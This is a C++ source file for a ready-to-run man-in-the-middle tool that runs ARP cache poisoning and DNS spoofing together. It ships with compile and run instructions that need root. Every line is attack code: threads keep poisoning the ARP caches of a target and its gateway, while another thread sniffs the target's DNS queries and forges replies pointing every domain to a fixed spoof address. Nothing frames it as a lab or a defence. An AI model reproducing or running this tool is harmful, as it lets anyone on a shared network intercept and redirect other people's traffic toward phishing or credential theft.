// Compile: g++ -o arp_dns arp_dns.cpp -lpthread
// Run: sudo ./arp_dns <target_ip> <target_mac> <gateway_ip> <gateway_mac> <attacker_mac> <iface>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <unistd.h>
#include <sys/socket.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <linux/if_packet.h>
#include <arpa/inet.h>
#include <thread>
#include <atomic>

class ARPDNSCombo {
private:
    int arpSock, packetSock;
    std::string iface, attackerMAC;
    std::atomic<bool> running{false};
    std::string spoofIP = "1.2.3.4";
    
    void macToBytes(const std::string& mac, uint8_t* out) {
        sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &out[0], &out[1], &out[2], &out[3], &out[4], &out[5]);
    }
    
    int encodeName(char* buf, const std::string& name) {
        int pos = 0;
        size_t start = 0, dot;
        while ((dot = name.find('.', start)) != std::string::npos) {
            int len = dot - start;
            buf[pos++] = len;
            memcpy(buf + pos, name.c_str() + start, len);
            pos += len;
            start = dot + 1;
        }
        int len = name.length() - start;
        buf[pos++] = len;
        memcpy(buf + pos, name.c_str() + start, len);
        pos += len;
        buf[pos++] = 0;
        return pos;
    }
    
public:
    ARPDNSCombo(const std::string& i, const std::string& amac)
        : iface(i), attackerMAC(amac) {
        arpSock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
        struct sockaddr_ll sll;
        memset(&sll, 0, sizeof(sll));
        sll.sll_family = AF_PACKET;
        sll.sll_ifindex = if_nametoindex(iface.c_str());
        bind(arpSock, (struct sockaddr*)&sll, sizeof(sll));
        
        packetSock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
        bind(packetSock, (struct sockaddr*)&sll, sizeof(sll));
    }
    
    void sendARP(const std::string& srcIP, const std::string& srcMAC,
                 const std::string& dstIP, const std::string& dstMAC) {
        uint8_t packet[42];
        memset(packet, 0, sizeof(packet));
        
        struct ether_header* eth = (struct ether_header*)packet;
        struct ether_arp* arp = (struct ether_arp*)(packet + 14);
        
        macToBytes(dstMAC, eth->ether_dhost);
        macToBytes(srcMAC, eth->ether_shost);
        eth->ether_type = htons(ETH_P_ARP);
        
        arp->arp_hrd = htons(ARPHRD_ETHER);
        arp->arp_pro = htons(ETH_P_IP);
        arp->arp_hln = 6;
        arp->arp_pln = 4;
        arp->arp_op = htons(ARPOP_REPLY);
        
        macToBytes(srcMAC, arp->arp_sha);
        inet_pton(AF_INET, srcIP.c_str(), arp->arp_spa);
        macToBytes(dstMAC, arp->arp_tha);
        inet_pton(AF_INET, dstIP.c_str(), arp->arp_tpa);
        
        struct sockaddr_ll sll;
        memset(&sll, 0, sizeof(sll));
        sll.sll_family = AF_PACKET;
        sll.sll_ifindex = if_nametoindex(iface.c_str());
        sll.sll_halen = 6;
        memcpy(sll.sll_addr, eth->ether_dhost, 6);
        
        sendto(arpSock, packet, 42, 0, (struct sockaddr*)&sll, sizeof(sll));
    }
    
    void poisonLoop(const std::string& targetIP, const std::string& targetMAC,
                    const std::string& gatewayIP, const std::string& gatewayMAC) {
        while (running.load()) {
            sendARP(gatewayIP, attackerMAC, targetIP, targetMAC);
            sendARP(targetIP, attackerMAC, gatewayIP, gatewayMAC);
            usleep(500000);
        }
    }
    
    // Intercept DNS queries and respond with spoofed IP
    void dnsInterceptLoop(const std::string& targetIP) {
        uint8_t buffer[65536];
        struct in_addr targetAddr;
        inet_pton(AF_INET, targetIP.c_str(), &targetAddr);
        
        while (running.load()) {
            struct timeval tv;
            tv.tv_sec = 1;
            tv.tv_usec = 0;
            setsockopt(packetSock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
            
            int bytes = recv(packetSock, buffer, sizeof(buffer), 0);
            if (bytes < 42) continue;
            
            struct iphdr* ip = (struct iphdr*)(buffer + 14);
            if (ip->saddr != targetAddr.s_addr) continue;
            if (ip->protocol != IPPROTO_UDP) continue;
            
            struct udphdr* udp = (struct udphdr*)(buffer + 14 + (ip->ihl * 4));
            if (ntohs(udp->dest) != 53) continue;
            
            char* dns = (char*)udp + sizeof(struct udphdr);
            uint16_t txid = ntohs(*(uint16_t*)dns);
            uint16_t flags = ntohs(*(uint16_t*)(dns + 2));
            if (flags & 0x8000) continue;  // Query only
            
            // Extract domain from query
            std::string domain;
            int pos = 12;
            while (dns[pos] != 0) {
                int len = dns[pos++];
                if (!domain.empty()) domain += ".";
                domain += std::string(dns + pos, len);
                pos += len;
            }
            
            std::cout << "[DNS] Intercepted: " << domain << "\n";
            
            // Send forged response
            // Build packet back to target
            uint8_t response[512];
            memset(response, 0, sizeof(response));
            
            struct ether_header* eth = (struct ether_header*)response;
            struct iphdr* rip = (struct iphdr*)(response + 14);
            struct udphdr* rudp = (struct udphdr*)(response + 14 + sizeof(struct iphdr));
            char* rdns = (char*)rudp + sizeof(struct udphdr);
            
            memcpy(eth->ether_dhost, buffer + 6, 6);  // Target MAC
            macToBytes(attackerMAC, eth->ether_shost);
            eth->ether_type = htons(ETH_P_IP);
            
            *(uint16_t*)(rdns + 0) = htons(txid);
            *(uint16_t*)(rdns + 2) = htons(0x8180);
            *(uint16_t*)(rdns + 4) = htons(1);
            *(uint16_t*)(rdns + 6) = htons(1);
            
            memcpy(rdns + 12, dns + 12, pos - 12);
            int rpos = pos;
            
            *(uint16_t*)(rdns + rpos) = htons(0xC00C); rpos += 2;
            *(uint16_t*)(rdns + rpos) = htons(1); rpos += 2;
            *(uint16_t*)(rdns + rpos) = htons(1); rpos += 2;
            *(uint32_t*)(rdns + rpos) = htonl(3600); rpos += 4;
            *(uint16_t*)(rdns + rpos) = htons(4); rpos += 2;
            struct in_addr spoofAddr;
            inet_pton(AF_INET, spoofIP.c_str(), &spoofAddr);
            memcpy(rdns + rpos, &spoofAddr.s_addr, 4); rpos += 4;
            
            rudp->source = htons(53);
            rudp->dest = udp->source;
            rudp->len = htons(sizeof(struct udphdr) + rpos);
            
            rip->ihl = 5;
            rip->version = 4;
            rip->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + rpos;
            rip->ttl = 64;
            rip->protocol = IPPROTO_UDP;
            rip->saddr = ip->daddr;
            rip->daddr = ip->saddr;
            
            int totalLen = 14 + rip->tot_len;
            send(packetSock, response, totalLen, 0);
        }
    }
    
    void run(const std::string& targetIP, const std::string& targetMAC,
             const std::string& gatewayIP, const std::string& gatewayMAC) {
        std::cout << "[*] ARP + DNS poisoning combo\n";
        running = true;
        
        std::thread arpThread(&ARPDNSCombo::poisonLoop, this,
                              targetIP, targetMAC, gatewayIP, gatewayMAC);
        std::thread dnsThread(&ARPDNSCombo::dnsInterceptLoop, this, targetIP);
        
        while (true) sleep(1);
    }
    
    ~ARPDNSCombo() {
        running = false;
        close(arpSock);
        close(packetSock);
    }
};

int main(int argc, char* argv[]) {
    if (argc != 7) {
        std::cerr << "Usage: " << argv[0] 
                  << " <target_ip> <target_mac> <gateway_ip> <gateway_mac> <attacker_mac> <iface>\n";
        return 1;
    }
    ARPDNSCombo combo(argv[6], argv[5]);
    combo.run(argv[1], argv[2], argv[3], argv[4]);
    return 0;
}
